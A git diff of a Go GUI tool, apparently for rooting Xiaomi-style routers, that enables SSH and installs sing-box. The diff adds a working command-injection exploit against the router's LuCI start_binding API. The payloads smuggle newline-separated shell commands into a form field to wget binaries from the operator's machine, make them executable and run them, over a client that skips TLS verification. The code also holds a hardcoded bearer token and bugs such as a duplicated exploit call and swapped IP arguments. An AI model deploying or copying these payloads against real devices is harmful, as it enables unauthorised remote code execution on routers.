@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"crypto/md5"
+	"crypto/tls"
 	_ "embed"
 	"encoding/base64"
 	"encoding/json"
@@ -430,20 +431,23 @@ func getLocalSubnet() (string, error) {
 }
 
 func (w *AppWindow) checkSingBoxStarted(ip string) {
-	resp, err := http.Get(fmt.Sprintf("http://%s:%d", ip, 16756))
+	req, _ := http.NewRequest("GET", fmt.Sprintf("http://%s:%d/proxies", ip, 16756), nil)
+	req.Header.Set("Authorization", "Bearer gGY-Uyys7fbgbns")
+
+	client := http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Printf("Failed to connect to %s:%d\n", ip, 16756)
 		return
 	}
 	defer resp.Body.Close()
 
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		w.logContent += fmt.Sprintf("Error reading body from: %v", err)
+	if resp.StatusCode != 200 {
+		w.logContent += fmt.Sprintf("Failed to connect to %s:%d\n", ip, 16756)
 		w.logText.SetText(w.logContent)
 	}
 
-	w.logContent += fmt.Sprintf("Sing-box started: %s", body)
+	w.logContent += fmt.Sprintf("Sing-box started success!")
 	w.logText.SetText(w.logContent)
 
 }
@@ -691,7 +695,7 @@ func (w *AppWindow) installSingBox() {
 		w.logText.SetText(w.logContent)
 	}
 
-	_, err = runSSHCommand(client, "mkdir", "-p", "/data/etc/sing-box")
+	_, err = runSSHCommand(client, "mkdir", "-p", "/data/sing-box")
 	if err != nil {
 		w.logContent += fmt.Sprintf("Error mkdir for sing-box %s.\n", err.Error())
 		w.logText.SetText(w.logContent)
@@ -700,7 +704,7 @@ func (w *AppWindow) installSingBox() {
 	w.logText.SetText(w.logContent)
 
 	copyTask := func() error {
-		return copyFileToRemote(client, "./sing-box_temp", "/data/etc/sing-box/sing-box")
+		return copyFileToRemote(client, "./sing-box_temp", "/data/sing-box/sing-box")
 	}
 	w.showProgressWithDots("Trying to copy binary file to router", updateText, copyTask)
 
@@ -726,9 +730,25 @@ func (w *AppWindow) installSingBox() {
 	w.logText.SetText(w.logContent)
 
 	copyConfigTask := func() error {
-		return copyFileToRemote(client, "./config.json", "/data/etc/sing-box/config.json")
+		return copyFileToRemote(client, "./config.json", "/data/sing-box/config.json")
 	}
 	w.showProgressWithDots("Sing-box init file copied to router", updateText, copyConfigTask)
+}
+
+func (w *AppWindow) unInstallSingBox() {
+	client, err := w.loginSSH()
+	if err != nil {
+		w.logContent += fmt.Sprintf("Error ssh login %s.\n", err.Error())
+		w.logText.SetText(w.logContent)
+	}
+
+	_, err = runSSHCommand(client, "rm", "-rf", "/data/sing-box", "/data/etc/sing-box", "/etc/init.d/sing-box")
+	if err != nil {
+		w.logContent += fmt.Sprintf("Error uninstall for sing-box %s.\n", err.Error())
+		w.logText.SetText(w.logContent)
+	}
+	w.logContent += fmt.Sprintf("Sing-box mkdir success!.\n")
+	w.logText.SetText(w.logContent)
 }
 
 func (w *AppWindow) installSingBoxConfig() {
@@ -738,7 +758,7 @@ func (w *AppWindow) installSingBoxConfig() {
 	if strings.HasPrefix(path, "file://") {
 		path = strings.TrimPrefix(path, "file://")
 	}
-	err = copyFileToRemote(client, path, "/data/etc/sing-box/config.json")
+	err = copyFileToRemote(client, path, "/data/sing-box/config.json")
 	if err != nil {
 		w.logContent += fmt.Sprintf("Error copying config file to router %s.\n", err.Error())
 		w.logText.SetText(w.logContent)
@@ -886,6 +906,7 @@ const (
 	port          = "8080"
 	serverMsg     = "HTTP query:"
 	sshInfo       = "SSH enabled on %s:23323."
+	urlFormat     = "http://%s/cgi-bin/luci/;stok=%s/api/xqsystem/start_binding"
 	trigger       = "Generating 2048 bit rsa key"
 	ping1Template = `mkdir -p /etc/config/dropbear
 a=$(/tmp/dropbearkey -t rsa -f /etc/config/dropbear/dropbear_rsa_host_key 2>&1 | base64 -w 0)
@@ -971,6 +992,83 @@ func createPayload(localIP string) error {
 	return nil
 }
 
+func sendPayload(localIP, routerIP, token string) error {
+	url := fmt.Sprintf(urlFormat, routerIP, token)
+
+	headers := map[string]string{
+		"Host":                      routerIP,
+		"Upgrade-Insecure-Requests": "1",
+		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
+		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+		"Accept-Encoding":           "gzip, deflate",
+		"Accept-Language":           "zh-CN,zh;q=0.9",
+		"Connection":                "close",
+		"Content-Type":              "application/x-www-form-urlencoded",
+	}
+
+	payloads := []string{
+		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/ping1%%0Awget%%20\"http://%s:%s/ping1\"%%20-P%%20/tmp'", localIP, port),
+		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbear%%0Awget%%20\"http://%s:%s/dropbear\"%%20-P%%20/tmp'", localIP, port),
+		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbearkey%%0Awget%%20\"http://%s:%s/dropbearkey\"%%20-P%%20/tmp'", localIP, port),
+		"uid=1234&key=1234'%%0Achmod%%20%%2bx%%20/tmp/ping1%%0Achmod%%20%%2bx%%20/tmp/dropbear%%0Achmod%%20%%2bx%%20/tmp/dropbearkey%%0a/tmp/ping1'",
+	}
+
+	for _, payload := range payloads {
+		if err := sendHttpRequest(url, headers, payload); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func sendHttpRequest(url string, headers map[string]string, payload string) error {
+	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
+	if err != nil {
+		fmt.Println("Error creating http request ")
+		return err
+	}
+
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
+
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   5 * time.Second,
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("Error executing http request ")
+		return err
+	}
+	defer func(Body io.ReadCloser) {
+		err := Body.Close()
+		if err != nil {
+			return
+		}
+	}(resp.Body)
+
+	if resp.StatusCode != http.StatusOK {
+		//body, _ := io.ReadAll(resp.Body)
+		fmt.Println("Error executing http request ")
+	}
+	return nil
+}
+
+func runRD16Exploit(localIp, routerIp, token string) {
+	if err := createPayload(localIp); err != nil {
+		fmt.Println(err.Error())
+	}
+	if err := sendPayload(localIp, routerIp, token); err != nil {
+		fmt.Println(err.Error())
+	}
+
+}
+
 func main() {
 	myApp := app.New()
 	myWindow := myApp.NewWindow("RD15 Tool")
@@ -1019,7 +1117,7 @@ func main() {
 
 	singboxConfigInput := widget.NewEntry()
 
-	openFileButton := widget.NewButton("Choose singbox config", func() {
+	openFileButton := widget.NewButton("Choose sing-box config", func() {
 		fileDialog := dialog.NewFileOpen(
 			func(reader fyne.URIReadCloser, err error) {
 				if err != nil {
@@ -1067,19 +1165,17 @@ func main() {
 				if err != nil {
 					fmt.Println(err.Error())
 				}
-				//TODO compare router and local ips ang get correct
-				fmt.Println(localIPs)
+				//TODO compare router and local ips ang get right ip
 				localIP.SetText(localIPs[0])
 
 				var wg sync.WaitGroup
 				wg.Add(1)
-				fmt.Println(appWindow.routerModel)
-				//TODO change model before push!
 
 				go func() {
 					defer wg.Done()
 					runServer(localIPs[0], ipInput.Text)
 				}()
+
 			}
 
 		}
@@ -1101,6 +1197,12 @@ func main() {
 		if appWindow.enableSSH() {
 			sshEnabled.SetText("SSH enabled")
 		}
+		if appWindow.routerModel == "RD15" {
+			runRD16Exploit(ipInput.Text, localIP.Text, stokInput.Text)
+		}
+		if appWindow.routerModel == "RD15" {
+			runRD16Exploit(ipInput.Text, localIP.Text, stokInput.Text)
+		}
 	})
 	sshEnableButton.Disable()
 
@@ -1113,9 +1215,7 @@ func main() {
 			sshPasswordInput: sshPasswordInput,
 		}
 		appWindow.enableSSHPermanent()
-		if err := createPayload(localIP.Text); err != nil {
-			fmt.Println(err.Error())
-		}
+
 	})
 	sshLoginButton.Disable()
 
@@ -1132,6 +1232,19 @@ func main() {
 	})
 	installSingBox.Disable()
 
+	unInstallSingBox := widget.NewButton("Uninstall sing-box", func() {
+		appWindow := &AppWindow{
+			stokInput:          stokInput,
+			ipInput:            ipInput,
+			passwordInput:      passwordInput,
+			logText:            logText,
+			singboxConfigInput: singboxConfigInput,
+			sshPasswordInput:   sshPasswordInput,
+		}
+		appWindow.unInstallSingBox()
+	})
+	unInstallSingBox.Disable()
+
 	installSingBoxConfig := widget.NewButton("Install sing-box config file", func() {
 		appWindow := &AppWindow{
 			stokInput:          stokInput,
@@ -1144,6 +1257,8 @@ func main() {
 		appWindow.installSingBoxConfig()
 	})
 	installSingBoxConfig.Disable()
+
+	singBoxInstallBorder := container.NewBorder(nil, nil, installSingBoxConfig, unInstallSingBox, installSingBox)
 
 	startSingBox := widget.NewButton("Start SingBox", func() {
 		appWindow := &AppWindow{
@@ -1228,6 +1343,7 @@ func main() {
 			installSingBoxConfig.Enable()
 			sshLoginButton.Enable()
 			installSingBox.Enable()
+			unInstallSingBox.Enable()
 			openFileButton.Enable()
 			enableUART.Enable()
 		}
@@ -1238,7 +1354,7 @@ func main() {
 		passwordContainer,
 		stokLabel, stokInputBorder,
 		sshPasswordLabel, sshPasswordBorder,
-		trySSHLoginButton, sshEnableButton, sshLoginButton, openFileButton, singboxConfigInput, installSingBox, installSingBoxConfig, startSingBox, stopSingBox, enableSingboxPermanent,
+		trySSHLoginButton, sshEnableButton, sshLoginButton, openFileButton, singboxConfigInput, singBoxInstallBorder, startSingBox, stopSingBox, enableSingboxPermanent,
 		vlanBorder,
 		enableUART,
 		logText,
